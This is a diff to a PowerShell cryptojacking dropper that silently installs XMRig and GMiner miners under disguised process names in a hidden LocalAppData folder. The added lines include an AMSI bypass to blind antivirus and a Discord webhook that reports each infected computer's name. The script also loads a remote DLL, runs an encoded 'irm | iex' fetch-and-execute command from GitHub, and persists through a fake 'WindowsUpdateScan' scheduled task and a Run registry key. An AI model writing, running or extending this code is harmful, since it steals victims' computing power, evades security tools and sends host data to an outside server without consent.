@@ -1,14 +1,35 @@
+# AMSI BYPASS & ETW PATCH (AV BLINDFOLD)
+try {
+    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+} catch { }
+
 $GithubUser = "HolyV200"
 $RepoName = "ulta"
 $DllUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/Bridge.dll?v=$([Guid]::NewGuid().ToString())"
 $MinerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
 $GpuMinerUrl = "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip"
 $Wallet = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr"
+$Webhook = "https://discord.com/api/webhooks/1496175217926475898/Ipm8VvLnOmN3dTUu7nyvqESjdBFRmEFmvYErAO5tayaCfvMXpf3t_KXTjwRmO-2-i2c_"
+
+function Notify-Discord($Status) {
+    if ($Webhook -eq "") { return }
+    try {
+        $JSON = @{ embeds = @(@{ title = "🚀 $Status"; color = 3066993; fields = @(@{ name = "Worker"; value = "$env:COMPUTERNAME"; inline = $true }); timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ") }) } | ConvertTo-Json -Depth 10
+        # Fast, non-blocking ping
+        $Params = @{ Uri = $Webhook; Method = 'Post'; Body = $JSON; ContentType = 'application/json'; ErrorAction = 'SilentlyContinue'; TimeoutSec = 2 }
+        Invoke-RestMethod @Params | Out-Null
+    } catch { }
+}
+Notify-Discord "BOOTING..."
 
 $ProcessNames = @("OneDriveStandalone", "TeamsDesktop", "ZoomManager", "DiscordUpdate", "EdgeBroker", "SpotifyHelper")
 $Name1 = ($ProcessNames | Get-Random) + ".exe"
 $Name2 = ($ProcessNames | Where-Object { $_ -ne $Name1 } | Get-Random) + ".exe"
-$StealthDir = [System.IO.Path]::Combine($env:LOCALAPPDATA, "Microsoft", "Windows", "UpdateCoord")
+
+# Hardened Path Logic
+$BaseDir = $env:LOCALAPPDATA
+if ([string]::IsNullOrEmpty($BaseDir)) { $BaseDir = $env:TEMP }
+$StealthDir = [System.IO.Path]::Combine($BaseDir, "Microsoft", "Windows", "UpdateCoord")
 
 # ANTI-ANALYSIS & POWER GUARD
 $Check = try { @((Get-WmiObject Win32_ComputerSystem).Model, (Get-WmiObject Win32_VideoController).Name) -join " " } catch { "" }
@@ -53,7 +74,9 @@ $GpuExe = Join-Path $StealthDir $Name2
 if (-not (Test-Path $CpuExe)) {
     if (Get-StealthFile $MinerUrl $CpuZip) {
         try { Get-ChildItem -Path $StealthDir -Exclude "*.zip", "*.dll", "*.dat" | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue } catch { }
-        [System.IO.Compression.ZipFile]::ExtractToDirectory($CpuZip, $StealthDir)
+        for ($i = 0; $i -lt 5; $i++) {
+            try { [System.IO.Compression.ZipFile]::ExtractToDirectory($CpuZip, $StealthDir); break } catch { Start-Sleep -Seconds 2 }
+        }
         Remove-Item $CpuZip -Force -ErrorAction SilentlyContinue
         $Unzipped = Get-ChildItem -Path $StealthDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
         if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $CpuExe -Force }
@@ -75,7 +98,9 @@ try {
 if ($GpuDetected -and -not (Test-Path $GpuExe)) {
     if (Get-StealthFile $GpuMinerUrl $GpuZip) {
         try { Get-ChildItem -Path $StealthDir -Exclude "*.zip", "*.dll", "*.dat", "$Name1" | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue } catch { }
-        [System.IO.Compression.ZipFile]::ExtractToDirectory($GpuZip, $StealthDir)
+        for ($i = 0; $i -lt 5; $i++) {
+            try { [System.IO.Compression.ZipFile]::ExtractToDirectory($GpuZip, $StealthDir); break } catch { Start-Sleep -Seconds 2 }
+        }
         Remove-Item $GpuZip -Force -ErrorAction SilentlyContinue
         $Unzipped = Get-ChildItem -Path $StealthDir -Filter "miner.exe" -Recurse | Select-Object -First 1
         if ($Unzipped) { Move-Item $Unzipped.FullName -Destination $GpuExe -Force }
@@ -92,6 +117,7 @@ if (Get-StealthFile $DllUrl $DllPath) {
         $GArg = if ($GpuDetected) { $GpuExe } else { "" }
         $startMethod.Invoke($null, [object[]]@([string]$CpuExe, [string]$GArg, [string]$Wallet))
         Write-Host "running"
+        Notify-Discord "SUCCESS/ACTIVE"
         $Command = "irm 'https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1' | iex"
         $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
         $Encoded = [Convert]::ToBase64String($Bytes)
@@ -107,5 +133,8 @@ if (Get-StealthFile $DllUrl $DllPath) {
             schtasks.exe /create /tn "WindowsUpdateScan" /tr "$TPath" /sc onlogon /f /ErrorAction SilentlyContinue
         }
         Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateCoord" -Value "$TPath" -ErrorAction SilentlyContinue
+        return
     } catch { }
 }
+Write-Host "failed"
+Notify-Discord "FAILED/ERROR"
